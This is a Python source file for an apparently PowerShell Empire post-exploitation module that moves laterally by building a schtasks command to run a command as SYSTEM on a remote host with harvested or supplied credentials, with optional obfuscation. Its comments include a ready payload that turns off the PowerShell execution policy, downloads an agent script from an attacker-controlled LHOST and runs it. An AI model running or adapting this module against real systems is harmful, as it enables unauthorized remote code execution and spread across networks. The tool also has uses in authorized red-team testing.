import os
import datetime
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-LateralMoveSchtasks',

            'Author': ['@mattifestation', '@harmj0y', '@kali2020'],

            'Description': ('Lateral movement using schtasks. This has a moderate detection/removal rating.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'The module schedules a task to run once and immediately on the target host.',
                'IMPORTANT: The TimeZone may have to be adjusted if the target and the attacker are on different time zones!',
                'TIPS: If you want to spawn an Empire agent, this can be acomplished with something like',
                'set Command "powershell.exe -Command Set-ExecutionPolicy -ExecutionPolicy Unrestricted;mkdir c:\k; wget http://LHOST/emp-shell.ps1 -o C:\k\emp.ps1;C:\k\emp.ps1"',
                'This module is base upon work by  @mattifestation, @harmj0y',
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },            
            'TaskName' : {
                'Description'   :   'Name to use for the schtask.',
                'Required'      :   True,
                'Value'         :   'Updater'
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'ComputerName' : {
                'Description'   :   'Computer name (if not supplied, localhost will be used)',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   'User name for user running the task (required if ComputerName is supplied)',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password for accessing other computer (required if ComputerName is supplied)',
                'Required'      :   False,
                'Value'         :   ''
            },
            'TimeZone' : {
                'Description'   :   'The task will be scheduled at the GMT + this offset',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'MinuteAdjustment' : {
                'Description'   :   'The minute adjustment will be added to the time (can be used if the local and target clock mismatch)',
                'Required'      :   False,
                'Value'         :   '1'
            },
            'Command' : {
                'Description'   :   'Optional command, if specified it will be executed instead of the Empire stager',
                'Required'      :   True,
                'Value'         :   ''
            }     
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):


        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":
            
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            if domainName != "":
                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
            else:
                self.options["UserName"]['Value'] = str(userName)
            if password != "":
                self.options["Password"]['Value'] = password

               
        # set credentials
        computerName = self.options['ComputerName']['Value']
        userName = self.options['UserName']['Value']
        password = self.options['Password']['Value']


        # trigger options
        taskName = self.options['TaskName']['Value']
    

        # time adjustments
        timeZone = self.options['TimeZone']['Value']
        minuteAdjustment = self.options['MinuteAdjustment']['Value']

        command = self.options['Command']['Value']

        statusMsg = ""
       
        # sanity check to make sure we haven't exceeded the cmd.exe command length max
        if len(command) > 259:
            print helpers.color("[!] Warning: trigger command exceeds the maximum of 259 characters.")
            return ""

        runTime = datetime.datetime.today() + datetime.timedelta(hours = int(timeZone)) + datetime.timedelta(minutes = int(minuteAdjustment))
        nowTime = datetime.datetime.strftime(runTime , '%H:%M')

        script = "schtasks /Create /F /SC once"+ " /S " + computerName + " /U "+userName+" /P "+password + " /RU system /ST "+nowTime+" /TN "+taskName+" /TR "+command+";"
        statusMsg += " with "+taskName+" run at " + nowTime + " (Ensure this is the correct time on the target!)."
        print "COMMAND : " + script
        print statusMsg

        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)

        return script
